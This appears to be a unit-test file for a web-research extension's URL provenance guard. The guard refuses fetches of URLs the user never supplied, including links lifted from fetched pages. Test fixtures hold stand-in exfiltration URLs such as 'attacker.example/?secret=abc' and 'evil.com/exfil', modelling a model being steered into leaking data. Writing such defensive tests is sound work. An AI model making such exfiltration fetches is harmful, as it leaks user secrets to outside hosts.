// tests/unit/webResearchProvenance.test.ts — Layer 2 provenance tests (M65 C5).

import { describe, it, expect, beforeEach } from 'vitest';

let ext: any;
let DOMParserCtor: any;

async function loadDOMParser() {
  if (DOMParserCtor) return DOMParserCtor;
  try {
    const mod: any = await import('jsdom');
    DOMParserCtor = class { parseFromString(s: string) { return new mod.JSDOM(s).window.document; } };
  } catch {
    const mod: any = await import('happy-dom');
    DOMParserCtor = class { parseFromString(s: string) { const w = new mod.Window(); w.document.write(s); return w.document; } };
  }
  return DOMParserCtor;
}

// Import the extension via dynamic import — its top-level `export` syntax is
// a real ES module and vitest can load it directly.
beforeEach(async () => {
  ext = await import('../../ext/web-research/main.js');
  ext.__test__._setDOMParser(await loadDOMParser());
  ext.__test__.resetTurn('t1');
  ext.__test__.resetTurn('t2');
});

describe('canonicalUrl — provenance comparison shape', () => {
  it('agrees with the bridge: lowercase host+scheme, no fragment, strip trailing /', () => {
    const c = ext.__test__.canonicalUrl;
    expect(c('HTTPS://Example.COM/A?x=1#frag')).toBe('https://example.com/A?x=1');
    expect(c('https://example.com/')).toBe('https://example.com');
  });
});

describe('seedTurnFromUserMessage (C5)', () => {
  it('lexes https:// URLs from the user message into the turn set', () => {
    ext.__test__.seedTurnFromUserMessage('t1', 'check https://Foo.com/x and also https://bar.org/path?q=1');
    expect(ext.__test__._isUrlAllowedThisTurn('t1', 'https://foo.com/x')).toBe(true);
    expect(ext.__test__._isUrlAllowedThisTurn('t1', 'https://bar.org/path?q=1')).toBe(true);
  });
  it('does not lex http:// URLs (only https — bridge would reject http anyway)', () => {
    ext.__test__.seedTurnFromUserMessage('t1', 'http://nope.com/x');
    expect(ext.__test__._isUrlAllowedThisTurn('t1', 'http://nope.com/x')).toBe(false);
  });
});

describe('webFetchTool — provenance rejection of fabricated URL', () => {
  it('rejects with NOT_IN_PROVENANCE when LLM hands a URL the user never typed', async () => {
    // No seeding; the turn is empty.
    const res = await ext.__test__.webFetchTool({ url: 'https://attacker.example/?secret=abc' }, 't1');
    expect(res.isError).toBe(true);
    expect(res.errorCode).toBe('NOT_IN_PROVENANCE');
  });
});

describe('webFetchTool — depth-1 hard stop (C5 + milestone)', () => {
  it('URLs lexed from the FETCHED PAGE BODY are NOT added to provenance', async () => {
    // Seed the turn with one URL.
    ext.__test__.seedTurnFromUserMessage('t1', 'https://allowed.example/start');

    // Stub the bridge: webFetch returns HTML body containing a link to evil.com.
    ext.__test__._setBridge({
      'webFetch:request': async ({ url }: { url: string }) => ({
        ok: true,
        result: {
          status: 200,
          finalUrl: url,
          contentType: 'text/html',
          body: '<html><body><p>hi</p><a href="https://evil.com/exfil?x=1">click me</a></body></html>',
        },
      }),
    });

    const r1 = await ext.__test__.webFetchTool({ url: 'https://allowed.example/start' }, 't1');
    expect(r1.isError).toBe(false);

    // The model "extracts" the link from the response and tries to fetch it.
    const r2 = await ext.__test__.webFetchTool({ url: 'https://evil.com/exfil?x=1' }, 't1');
    expect(r2.isError).toBe(true);
    expect(r2.errorCode).toBe('NOT_IN_PROVENANCE');
  });
});

describe('webFetchTool — redirect final URL is added to provenance', () => {
  it('a follow-up fetch of the redirect destination is allowed', async () => {
    ext.__test__.seedTurnFromUserMessage('t1', 'https://allowed.example/start');
    ext.__test__._setBridge({
      'webFetch:request': async ({ url }: { url: string }) => ({
        ok: true,
        result: {
          status: 200,
          finalUrl: 'https://final.example/landed',  // simulated redirect destination
          contentType: 'text/html',
          body: '<html><body>ok</body></html>',
        },
      }),
    });
    const r1 = await ext.__test__.webFetchTool({ url: 'https://allowed.example/start' }, 't1');
    expect(r1.isError).toBe(false);
    // The model now fetches the final URL directly.
    const r2 = await ext.__test__.webFetchTool({ url: 'https://final.example/landed' }, 't1');
    expect(r2.isError).toBe(false);
  });
});

describe('webSearch results are added to provenance', () => {
  it('after a successful search, the result urls become fetchable', async () => {
    ext.__test__._setGlobalStorage({
      get: async (k: string) => {
        if (k === ext.__test__.KEY_BRAVE_API_KEY) return 'test-key';
        return null;
      },
      set: async () => {},
    });
    ext.__test__._setBridge({
      'webSearch:request': async () => ({
        ok: true,
        result: {
          results: [
            { title: 'A', url: 'https://result-a.example/p', snippet: '' },
            { title: 'B', url: 'https://result-b.example/q', snippet: '' },
          ],
        },
      }),
      'webFetch:request': async ({ url }: { url: string }) => ({
        ok: true,
        result: { status: 200, finalUrl: url, contentType: 'text/html', body: '<html><body>hi</body></html>' },
      }),
    });

    const s = await ext.__test__.webSearchTool({ query: 'parallx' }, 't2');
    expect(s.isError).toBe(false);

    const f = await ext.__test__.webFetchTool({ url: 'https://result-a.example/p' }, 't2');
    expect(f.isError).toBe(false);
  });
});

describe('per-turn isolation (C5 — no persistence across turns)', () => {
  it('a URL allowed in turn t1 is NOT allowed in turn t2', async () => {
    ext.__test__.seedTurnFromUserMessage('t1', 'https://allowed.example/x');
    expect(ext.__test__._isUrlAllowedThisTurn('t1', 'https://allowed.example/x')).toBe(true);
    expect(ext.__test__._isUrlAllowedThisTurn('t2', 'https://allowed.example/x')).toBe(false);
  });
});

describe('fetchReadableForExtension — the Studio\'s Add Link', () => {
  const page = (url: string, status = 200, body = '<html><head><title>Ada (character)</title></head><body><p>Ada keeps a lighthouse on the coast.</p></body></html>') => ({
    ok: true, result: { status, finalUrl: url, contentType: 'text/html', body },
  });

  it('fetches a wiki address with parentheses whole, not cut at the bracket', async () => {
    const asked: string[] = [];
    ext.__test__._setBridge({ 'webFetch:request': async ({ url }: { url: string }) => { asked.push(url); return page(url); } });
    const r = await ext.__test__.fetchReadableForExtension('https://wiki.example/wiki/Ada_(character)');
    expect(r.ok).toBe(true);
    expect(r.title).toBe('Ada (character)');
    expect(r.text).toContain('lighthouse');
    expect(asked).toEqual(['https://wiki.example/wiki/Ada_(character)']);
  });

  const wall = (url: string) => page(url, 403, '<html><head><title>Just a moment...</title></head><body><div id="cf-challenge">Please enable JavaScript.</div></body></html>');

  it('a 403 from a bot wall is read again with the browser engine, and that page is the source', async () => {
    const asked: string[] = [];
    ext.__test__._setBridge({
      'webFetch:request': async ({ url }: { url: string }) => wall(url),
      'webFetch:browserRequest': async ({ url }: { url: string }) => { asked.push(url); return { ok: true, result: { ...page(url).result, via: 'browser' } }; },
    });
    const r = await ext.__test__.fetchReadableForExtension('https://wiki.example/wiki/Ada');
    expect(r.ok).toBe(true);
    expect(r.text).toContain('lighthouse');
    expect(r.title).toBe('Ada (character)');
    expect(asked).toEqual(['https://wiki.example/wiki/Ada']);
  });

  it('when the browser engine cannot get it either, the reason names both', async () => {
    ext.__test__._setBridge({
      'webFetch:request': async ({ url }: { url: string }) => wall(url),
      'webFetch:browserRequest': async () => ({ ok: false, error: { code: 'BROWSER_CHALLENGE', message: 'The site asked for a human check that the browser engine could not pass on its own.' } }),
    });
    const r = await ext.__test__.fetchReadableForExtension('https://wiki.example/wiki/Ada');
    expect(r.ok).toBe(false);
    expect(r.error.code).toBe('HTTP_403');
    expect(r.error.message).toMatch(/refused the request \(403\)/);
    expect(r.error.message).toMatch(/browser engine could not get it either: The site asked for a human check/);
  });

  it('a bridge without the browser engine is a plain refusal, not a crash', async () => {
    ext.__test__._setBridge({ 'webFetch:request': async ({ url }: { url: string }) => wall(url) });
    const r = await ext.__test__.fetchReadableForExtension('https://wiki.example/wiki/Ada');
    expect(r.ok).toBe(false);
    expect(r.error.code).toBe('HTTP_403');
    expect(r.error.message).toMatch(/browser engine could not get it either/);
  });

  it('a missing page is not tried in the browser; with the setting off, nothing is', async () => {
    const browserCalls: string[] = [];
    const bridge = (status: number) => ({
      'webFetch:request': async ({ url }: { url: string }) => page(url, status, '<html><body>Not found</body></html>'),
      'webFetch:browserRequest': async ({ url }: { url: string }) => { browserCalls.push(url); return page(url); },
    });
    ext.__test__._setBridge(bridge(404));
    const nf = await ext.__test__.fetchReadableForExtension('https://wiki.example/missing');
    expect(nf.error.code).toBe('HTTP_404');
    expect(nf.error.message).toMatch(/no page at this address/);
    expect(browserCalls).toEqual([]);
    ext.__test__._setApi({ workspace: { getConfiguration: () => ({ get: (name: string, fallback: unknown) => (name === 'browserFallback' ? false : fallback) }) } });
    try {
      ext.__test__._setBridge(bridge(403));
      const off = await ext.__test__.fetchReadableForExtension('https://wiki.example/wiki/Ada');
      expect(off.error.code).toBe('HTTP_403');
      expect(browserCalls).toEqual([]);
    } finally {
      ext.__test__._setApi(null);
    }
  });

  it('passes the bridge\'s own refusal through as the reason', async () => {
    ext.__test__._setBridge({ 'webFetch:request': async () => ({ ok: false, error: { code: 'NOT_HTTPS', message: 'Refusing non-HTTPS URL: http://' } }) });
    const r = await ext.__test__.fetchReadableForExtension('http://wiki.example/wiki/Ada');
    expect(r.ok).toBe(false);
    expect(r.error.code).toBe('NOT_HTTPS');
  });
});

describe('the chat seeds what the user typed (2026-10-05)', () => {
  function emitter<T>() {
    const fns: ((e: T) => void)[] = [];
    const on = (fn: (e: T) => void) => { fns.push(fn); return { dispose() { fns.splice(fns.indexOf(fn), 1); } }; };
    return { on, fire: (e: T) => fns.forEach((f) => f(e)), size: () => fns.length };
  }

  it('lexes addresses out of prose: punctuation after them is not theirs, a bracket they opened is', () => {
    const lex = ext.__test__.lexUrls;
    expect(lex('see https://wiki.example/wiki/Ada_(character), then https://a.example/b.')).toEqual(['https://wiki.example/wiki/Ada_(character)', 'https://a.example/b']);
    expect(lex('(the page is https://a.example/x?q=1)')).toEqual(['https://a.example/x?q=1']);
    expect(lex('[https://a.example/y]')).toEqual(['https://a.example/y']);
    expect(lex('"https://a.example/z" and http://plain.example/')).toEqual(['https://a.example/z']);
  });

  it('a request start seeds its turn; its completion forgets the turn here and in the bridge', async () => {
    const start = emitter<{ sessionId: string; turnId: string; text: string }>();
    const done = emitter<{ sessionId: string; turnId: string }>();
    const resets: string[] = [];
    ext.__test__._setBridge({ 'webFetch:resetTurn': async (id: string) => { resets.push(id); return { ok: true }; } });
    const disposables = ext.__test__._wireChatTurns({ onDidStartRequest: start.on, onDidCompleteRequest: done.on });
    expect(disposables).toHaveLength(2);
    start.fire({ sessionId: 's', turnId: 'turn-9', text: 'Read https://wiki.example/wiki/Ada_(character) for me' });
    expect(ext.__test__._isUrlAllowedThisTurn('turn-9', 'https://wiki.example/wiki/Ada_(character)')).toBe(true);
    expect(ext.__test__._isUrlAllowedThisTurn('turn-8', 'https://wiki.example/wiki/Ada_(character)')).toBe(false);
    done.fire({ sessionId: 's', turnId: 'turn-9' });
    await new Promise((r) => setTimeout(r, 0));
    expect(ext.__test__._isUrlAllowedThisTurn('turn-9', 'https://wiki.example/wiki/Ada_(character)')).toBe(false);
    expect(resets).toEqual(['turn-9']);
    for (const d of disposables) d.dispose();
    expect(start.size()).toBe(0);
  });

  it('a turn the user typed may show them a site\'s human check; an autonomous turn may not', async () => {
    const start = emitter<{ sessionId: string; turnId: string; text: string; origin?: string }>();
    ext.__test__._wireChatTurns({ onDidStartRequest: start.on });
    const asked: { turnId: string; interactive: boolean }[] = [];
    const wall = (url: string) => ({ ok: true, result: { status: 403, finalUrl: url, contentType: 'text/html', body: '<html><head><title>Just a moment...</title></head><body></body></html>' } });
    ext.__test__._setBridge({
      'webFetch:request': async ({ url }: { url: string }) => wall(url),
      'webFetch:browserRequest': async (p: { turnId: string; interactive: boolean }) => { asked.push({ turnId: p.turnId, interactive: p.interactive }); return { ok: false, error: { code: 'BROWSER_CHALLENGE', message: 'no' } }; },
    });
    start.fire({ sessionId: 's', turnId: 'typed', text: 'read https://wall.example/page' });
    start.fire({ sessionId: 's', turnId: 'robot', text: 'read https://wall.example/page', origin: 'heartbeat' });
    await ext.__test__.webFetchTool({ url: 'https://wall.example/page' }, 'typed');
    await ext.__test__.webFetchTool({ url: 'https://wall.example/page' }, 'robot');
    expect(asked).toEqual([{ turnId: 'typed', interactive: true }, { turnId: 'robot', interactive: false }]);
    ext.__test__.resetTurn('typed');
    ext.__test__.resetTurn('robot');
  });

  it('a chat without the events is left alone', () => {
    expect(ext.__test__._wireChatTurns({})).toEqual([]);
    expect(ext.__test__._wireChatTurns(null)).toEqual([]);
  });
});

describe('searches are paced', () => {
  it('a 429 is tried once more; the second answer stands', async () => {
    let calls = 0;
    ext.__test__._setBridge({
      'webSearch:request': async () => (++calls === 1
        ? { ok: false, error: { code: 'SEARCH_HTTP_429', message: 'Brave Search HTTP 429' } }
        : { ok: true, result: { results: [{ title: 'A', url: 'https://a.example/', snippet: 's' }] } }),
    });
    ext.__test__._setGlobalStorage({ get: async () => null, set: async () => {}, delete: async () => {} });
    ext.__test__._setSearchPacing({ gapMs: 0, retryMs: 0 });
    const r = await ext.__test__.webSearchTool({ query: 'ada lovelace' }, 't1');
    expect(r.isError).toBe(false);
    expect(calls).toBe(2);
    expect(ext.__test__._isUrlAllowedThisTurn('t1', 'https://a.example/')).toBe(true);
  });
});
